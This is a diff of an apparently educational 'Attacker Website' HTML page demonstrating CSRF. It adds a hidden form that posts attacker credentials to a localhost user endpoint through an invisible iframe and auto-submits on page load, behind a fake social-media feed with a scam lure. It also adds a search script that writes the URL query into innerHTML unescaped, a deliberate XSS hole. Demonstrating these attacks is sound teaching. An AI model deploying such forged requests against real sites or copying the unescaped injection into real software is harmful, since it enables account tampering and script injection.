@@ -1,19 +1,150 @@
 <html lang=en>
   <head>
-    <meta charset=utf-8>
-    <title>The Attacker Website</title>
-    <link rel="stylesheet" type="text/css" href="css/tacit-css.min.css"/>
+  
   </head>
   <body>
     <h1>The Attacker Website</h1>
 
-    <section>
+    <!-- <section>
       <form method="post" action="http://localhost:3000/user">
           <input type="hidden" name="username" value="The Attacker">
           <input type="hidden" name="email" value="theattacker@attacker.com">
       </form>
       <a href="#" onclick="document.forms[0].submit()">Visit this website!</a>
-    </section>
+    </section> -->
+    <body>
+      <meta charset="utf-8">
+       <meta name="viewport" content="width=device-width, initial-scale=1">
+       <div class="container-fluid" style="margin-top:80px">
+      <h1>CSRF Demo</h1>
+      <!-- A simple form that when submitted will navigate back to the same page -->
+      <!-- <form action="" method="GET"> -->
+        <!-- Adds `?q=VALUE` to the URL when the form is submitted -->
+        <!-- <input type="text" name="q"> -->
+        <!-- <input type="submit" value="Search"> -->
+      <!-- </form> -->
+      
+      <form method="post" action="http://localhost:3000/user" target="hidden-form">
+        <input type="hidden" name="username" value="The Attacker">
+        <input type="hidden" name="email" value="theattacker@attacker.com">
+     </form>
+     <IFRAME style="display:none" name="hidden-form"></IFRAME>
+      <!-- The results of the search are inserted here -->
+      <div id="results"></div>
+      </div>
+      <div class="container">
+        <div class="row">
+            <div class="col-md-8">
+                <div class="post-content">
+                  <div class="post-container">
+                    <img src="https://bootdey.com/img/Content/avatar/avatar6.png" alt="user" class="profile-photo-md pull-left">
+                    <div class="post-detail">
+                      <div class="user-info">
+                        <h5><a href="timeline.html" class="profile-link">Alexis Clark</a> <span class="following">following</span></h5>
+                        <p class="text-muted">Published a photo about 3 mins ago</p>
+                      </div>
+                      <div class="reaction">
+                        <a class="btn text-green"><i class="fa fa-thumbs-up"></i> 13</a>
+                        <a class="btn text-red"><i class="fa fa-thumbs-down"></i> 0</a>
+                      </div>
+                      <div class="line-divider"></div>
+                      <div class="post-text">
+                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. <i class="em em-anguished"></i> <i class="em em-anguished"></i> <i class="em em-anguished"></i></p>
+                      </div>
+                      <div class="line-divider"></div>
+                      <div class="post-comment">
+                        <img src="https://bootdey.com/img/Content/avatar/avatar7.png" alt="" class="profile-photo-sm">
+                        <p><a href="timeline.html" class="profile-link">Diana </a><i class="em em-laughing"></i> Want to earn 20000$ now??? Click this link asap before it is taken!! </a> </p>
+                      </div>
+                      <div class="post-comment">
+                        <img src="https://bootdey.com/img/Content/avatar/avatar1.png" alt="" class="profile-photo-sm">
+                        <p><a href="timeline.html" class="profile-link">John</a> Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud </p>
+                      </div>
+                      <div class="post-comment">
+                        <img src="https://bootdey.com/img/Content/avatar/avatar1.png" alt="" class="profile-photo-sm">
+                        <input type="text" class="form-control" placeholder="Post a comment">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+            </div>
+        </div>
+    </div>
+      
+    
+      <script>
+        document.addEventListener('DOMContentLoaded', function() {
+    
+          /*
+            Get the search query from the URL. For example:
+            http://xss-example-page.nowhere/?q=Searching+for+things
+          */
+          var q = getQueryParameter('q');
+    
+          if (q) {
+    
+            search(q, function(error, results) {
+              showQueryAndResults(q, results);
+            });
+          }
+        });
+    
+        function search(q, callback) {
+    
+          // Fake results. We don't actually searching anything.
+          var results = [
+            'Result #1',
+            'Result #2',
+            'Result #3'
+          ];
+    
+          callback(null, results);
+        }
+    
+        function showQueryAndResults(q, results) {
+    
+          var resultsEl = document.querySelector('#results');
+          var html = '';
+    
+          html += '<p>Your search query:</p>';
+          html += '<pre>' + q + '</pre>';
+          html += '<ul>';
+    
+          for (var index = 0; index < results.length; index++) {
+            html += '<li>' + results[index] + '</li>';
+          }
+    
+          html += '</ul>';
+    
+          resultsEl.innerHTML = html;
+        }
+    
+        function getQueryParameter(name) {
+    
+          var pairs = window.location.search.substring(1).split('&');
+          var pair;
+    
+          for (var index = 0; index < pairs.length; index++) {
+    
+            pair = pairs[index].split('=');
+    
+            if (decodeURIComponent(pair[0]) === name) {
+              return decodeURIComponent(pair[1]);
+            }
+          }
+    
+          return false;
+        }
+      </script>
+      <script>
+        document.forms[0].submit();
+      </script>
+      <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    </body>
     
   </body>
 </html>
